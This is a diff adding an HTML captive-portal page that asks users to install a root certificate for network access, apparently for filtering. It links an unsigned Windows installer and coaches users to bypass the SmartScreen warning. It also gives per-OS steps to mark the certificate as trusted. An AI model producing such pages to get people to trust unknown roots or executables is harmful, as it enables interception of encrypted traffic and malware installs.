@@ -1,0 +1,270 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+
+<title>Network Certificate Installation</title>
+
+<style>
+
+body{
+font-family:Segoe UI,Arial,sans-serif;
+margin:0;
+background:#f4f6f9;
+color:#333;
+}
+
+header{
+background:#1f4e79;
+color:white;
+padding:30px;
+text-align:center;
+}
+
+.container{
+max-width:1000px;
+margin:auto;
+padding:30px;
+}
+
+.card{
+background:white;
+border-radius:8px;
+padding:30px;
+margin-bottom:25px;
+box-shadow:0 4px 10px rgba(0,0,0,0.08);
+}
+
+.install-btn{
+display:inline-block;
+background:#2d89ef;
+color:white;
+padding:16px 26px;
+font-size:18px;
+font-weight:600;
+border-radius:6px;
+text-decoration:none;
+margin-top:15px;
+}
+
+.install-btn:hover{
+background:#1b66c9;
+}
+
+.warning{
+background:#fff3cd;
+border-left:5px solid #ffc107;
+padding:15px;
+margin-top:20px;
+}
+
+.os-grid{
+display:grid;
+grid-template-columns:repeat(auto-fit,minmax(220px,1fr));
+gap:25px;
+}
+
+.os{
+text-align:center;
+}
+
+.os img{
+width:60px;
+margin-bottom:10px;
+}
+
+footer{
+text-align:center;
+padding:30px;
+font-size:14px;
+color:#777;
+}
+
+.hidden{
+display:none;
+}
+
+</style>
+
+</head>
+
+<body>
+
+<header>
+
+<h1>Network Certificate Required</h1>
+
+<p>
+To access the internet on this network you must install the security certificate.
+</p>
+
+</header>
+
+
+<div class="container">
+
+<div class="card">
+
+<h2>Automatic Install</h2>
+
+<p id="windowsText">
+If you are using Windows you can install the certificate automatically.
+</p>
+
+<a id="exeButton" class="install-btn" href="install-cert.exe">
+Install Automatically (Windows)
+</a>
+
+<div class="warning">
+
+<b>Windows Security Warning?</b>
+
+If Windows shows a SmartScreen warning:
+
+1. Click <b>More Info</b>  
+2. Click <b>Run Anyway</b>
+
+</div>
+
+</div>
+
+
+<div class="card">
+
+<h2>Manual Installation</h2>
+
+<p>
+If the automatic installer does not work, download the certificate and install it manually.
+</p>
+
+<a class="install-btn" href="certificate.crt">
+Download Certificate
+</a>
+
+</div>
+
+
+<div class="card">
+
+<h2>Installation Instructions</h2>
+
+<div class="os-grid">
+
+<div class="os">
+
+<img src="https://cdn-icons-png.flaticon.com/512/888/888882.png">
+
+<h3>Windows</h3>
+
+<ol style="text-align:left">
+
+<li>Download the certificate</li>
+<li>Double-click the file</li>
+<li>Select <b>Install Certificate</b></li>
+<li>Choose <b>Local Machine</b></li>
+<li>Install into <b>Trusted Root Certification Authorities</b></li>
+
+</ol>
+
+</div>
+
+
+<div class="os">
+
+<img src="https://cdn-icons-png.flaticon.com/512/2/2235.png">
+
+<h3>macOS</h3>
+
+<ol style="text-align:left">
+
+<li>Download the certificate</li>
+<li>Open the file</li>
+<li>Add to <b>System Keychain</b></li>
+<li>Set trust to <b>Always Trust</b></li>
+
+</ol>
+
+</div>
+
+
+<div class="os">
+
+<img src="https://cdn-icons-png.flaticon.com/512/831/831276.png">
+
+<h3>iPhone / iPad</h3>
+
+<ol style="text-align:left">
+
+<li>Download the certificate</li>
+<li>Open <b>Settings</b></li>
+<li>Tap <b>Profile Downloaded</b></li>
+<li>Install the profile</li>
+<li>Enable trust in Certificate Settings</li>
+
+</ol>
+
+</div>
+
+
+<div class="os">
+
+<img src="https://cdn-icons-png.flaticon.com/512/888/888839.png">
+
+<h3>Android</h3>
+
+<ol style="text-align:left">
+
+<li>Download the certificate</li>
+<li>Open <b>Security Settings</b></li>
+<li>Select <b>Install Certificate</b></li>
+<li>Choose the downloaded file</li>
+
+</ol>
+
+</div>
+
+</div>
+
+</div>
+
+
+<div class="card">
+
+<h2>Why is this required?</h2>
+
+<p>
+
+This network uses secure filtering to protect users and comply with safeguarding requirements.  
+Installing the certificate allows encrypted websites (HTTPS) to work correctly while connected to the network.
+
+</p>
+
+</div>
+
+</div>
+
+<footer>
+
+If you have any issues installing the certificate please contact IT support.
+
+</footer>
+
+
+
+<script>
+
+/* Hide Windows installer if not Windows */
+
+if(!navigator.userAgent.includes("Windows")){
+document.getElementById("exeButton").classList.add("hidden")
+document.getElementById("windowsText").innerText =
+"Automatic installer is available for Windows devices only."
+}
+
+</script>
+
+</body>
+
+</html>
